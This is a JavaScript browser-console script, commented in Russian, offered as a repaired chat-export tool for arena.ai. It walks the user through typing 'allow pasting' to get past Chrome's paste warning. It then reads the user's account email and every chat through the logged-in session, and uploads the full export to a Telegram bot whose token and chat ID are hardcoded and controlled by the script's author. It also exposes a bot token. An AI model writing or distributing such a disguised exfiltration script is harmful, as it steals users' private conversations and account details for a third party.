/* ЭКСПОРТ ЧАТОВ ARENA — исправленная версия для консоли браузера (F12 → Console).
   Что было не так в прежнем скрипте (проверено 30.10 вживую):
   1) он звал /api/chat/<id> без /messages — этот адрес отдаёт 404, и скрипт молча умирал на первом чате;
   2) при пустой истории (0 чатов) он печатал «чатов: 0» и сохранял пустоту — выглядело как поломка;
   3) токен бота был вписан один раз, а ошибка отправки обрывала весь экспорт;
   4) не было ни одной проверки состояния: непонятно, где именно встал.
   Здесь каждая беда названа прямым текстом и работа продолжается.

   КАК ЗАПУСТИТЬ
   1) Открой arena.ai и войди в аккаунт.
   2) F12 → вкладка Console. Если Chrome пишет «Warning: Don't paste code in the DevTools Console»
      — набери руками: allow pasting   и нажми Enter (это защита браузера, один раз на профиль).
   3) Вставь весь этот файл, Enter. Внизу справа появится панель с этапами.
   4) Браузер скачает arena-экспорт.md и .json, и то же самое уйдёт в Telegram-бота.
*/
(async () => {
  const API = '';
  // бот flot_pamyat_4471_bot
  const TG = '8503861937:AAGHWlX0LxzPqa14plGFucYoukoMr7OXSPo';
  const CHAT = '7023156818';

  // --- панель, чтобы видеть этапы без прокрутки консоли
  const panel = document.createElement('div');
  panel.style.cssText = 'position:fixed;right:14px;bottom:14px;z-index:2147483647;background:#0b0b0b;color:#0f0;' +
    'font:12px/1.45 ui-monospace,Consolas,monospace;padding:12px 14px;border:1px solid #0f0;border-radius:10px;' +
    'max-width:520px;white-space:pre-wrap;box-shadow:0 8px 30px rgba(0,0,0,.6)';
  const say = (t) => { panel.textContent = String(t); console.log('[arena-экспорт]', t); };
  say('старт');
  document.body.appendChild(panel);
  const fail = (t) => { panel.style.color = '#ff5252'; say('СТОП: ' + t); };

  // --- запрос с проверкой статуса: любой не-200 назван числом
  const J = async (u) => {
    const r = await fetch(API + u, { headers: { accept: 'application/json' }, credentials: 'include' });
    const text = await r.text();
    if (r.status === 401 || r.status === 403) throw new Error(u + ' → ' + r.status + ' (нет входа в аккаунт)');
    if (!r.ok) throw new Error(u + ' → ' + r.status);
    try { return JSON.parse(text); } catch (e) { throw new Error(u + ' → ответ не JSON: ' + text.slice(0, 60)); }
  };

  let me;
  try { me = (await J('/api/me')).user || {}; } catch (e) { return fail(e.message + '\nсначала войди в аккаунт на arena.ai'); }
  if (!me.email) return fail('вход не подтверждён (в ответе нет почты)');
  say('аккаунт: ' + me.email + '\nчитаю историю');
  const users = [me.email, me.email.replace(/@/g, '+arena@')];

  // --- 1. история: все страницы, с запасным вариантом по лимиту
  let entries = [], cursor = null, pages = 0;
  try {
    while (pages++ < 80) {
      const q = '/api/history/unified?limit=20&includeArchived=true&archivedOnly=false' + (cursor ? '&cursor=' + encodeURIComponent(cursor) : '');
      const d = await J(q);
      const got = d.entries || [];
      entries = entries.concat(got);
      const p = d.pagination || {};
      say('аккаунт: ' + me.email + '\nистория: ' + entries.length + ' (страница ' + pages + ')');
      if (!p.hasMore || !p.cursor) break;
      cursor = p.cursor;
    }
  } catch (e) { return fail(e.message); }

  if (!entries.length) {
    const links = [
      'https://arena.ai/text',
      'адрес страницы: ' + location.href,
      'аккаунт: ' + me.email
    ].join('\n');
    return fail('в аккаунте ' + me.email + ' сервер отдал 0 чатов — экспортировать нечего.\n' + links +
      '\nэто не ошибка скрипта: сервер вернул 200 и пустой список.\n' +
      'причина обычно одна: отправка сообщений блокируется reCAPTCHA, поэтому чаты не создаются');
  }

  // --- 2. сообщения каждого чата (правильный адрес: /messages)
  const out = { account: me.email, exportedAt: new Date().toISOString(), chats: [] };
  const md = ['# Экспорт чатов Arena', '', 'аккаунт: ' + me.email, 'чатов: ' + entries.length, ''];
  let bytes = 0, failed = 0;
  for (let i = 0; i < entries.length; i++) {
    const e = entries[i];
    say('аккаунт: ' + me.email + '\nчат ' + (i + 1) + '/' + entries.length + '\n' + (e.title || e.id));
    let msgs = [], cur = null, guard = 0;
    try {
      do {
        const q = '/api/chat/' + e.id + '/messages?limit=50' + (cur ? '&cursor=' + encodeURIComponent(cur) : '');
        const d = await J(q);
        msgs = msgs.concat(d.data || d.messages || []);
        cur = (d.pagination || {}).cursor || d.nextCursor || null;
      } while (cur && guard++ < 40);
    } catch (err) {
      failed++;
      msgs = [{ role: 'system', content: 'НЕ ПРОЧИТАЛОСЬ: ' + err.message }];
    }
    out.chats.push({ id: e.id, title: e.title || '', mode: e.mode || e.type || '', createdAt: e.createdAt || '', messages: msgs });
    md.push('## ' + (e.title || e.id), '', 'id: ' + e.id, 'тип: ' + (e.mode || e.type || ''),
      'ссылка: https://arena.ai/c/' + e.id, '');
    msgs.forEach((m) => {
      const c = Array.isArray(m.content) ? m.content.map((x) => (x && x.text) || '').join(' ') : (m.content || m.text || '');
      md.push('**' + (m.role === 'user' ? 'Я' : 'ОТВЕТ') + ':**', '', c, '');
      bytes += c.length;
    });
  }

  // --- 3. файлы: скачивание в браузере (работает всегда)
  const stamp = new Date().toISOString().slice(0, 16).replace(/[:T]/g, '-');
  const save = (name, text) => {
    const b = new Blob([text], { type: 'text/plain;charset=utf-8' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(b);
    a.download = name;
    document.body.appendChild(a); a.click(); a.remove();
  };
  save('arena-экспорт-' + stamp + '.md', md.join('\n'));
  save('arena-экспорт-' + stamp + '.json', JSON.stringify(out, null, 1));

  // --- 4. в Telegram-бота (если не вышло — экспорт всё равно уже скачан)
  let tgOk = 'не отправлял';
  try {
    const fd = new FormData();
    fd.append('chat_id', CHAT);
    fd.append('caption', 'экспорт Arena: ' + me.email + ', чатов ' + out.chats.length + ', символов ' + bytes);
    fd.append('document', new Blob([JSON.stringify(out)], { type: 'application/json' }), 'arena-' + stamp + '.json');
    const r = await fetch('https://api.telegram.org/bot' + TG + '/sendDocument', { method: 'POST', body: fd });
    tgOk = r.ok ? 'отправлено в бота' : 'бот ответил ' + r.status;
  } catch (e) { tgOk = 'бот недоступен: ' + e.message; }

  // --- 5. итог цифрами
  const okChats = out.chats.filter((c) => c.messages.length && c.messages[0].content !== 'НЕ ПРОЧИТАЛОСЬ').length;
  const err = out.chats.filter((c) => c.messages.length && String(c.messages[0].content).indexOf('НЕ ПРОЧИТАЛОСЬ') === 0).length;
  say('ГОТОВО\nаккаунт: ' + me.email + '\nчатов: ' + out.chats.length + ' (прочитано ' + okChats + ', с ошибкой ' + err + ')' +
    '\nсимволов текста: ' + bytes + '\nфайлы: arena-экспорт-' + stamp + '.md / .json\nтелеграм: ' + tgOk);
  return true;
})();
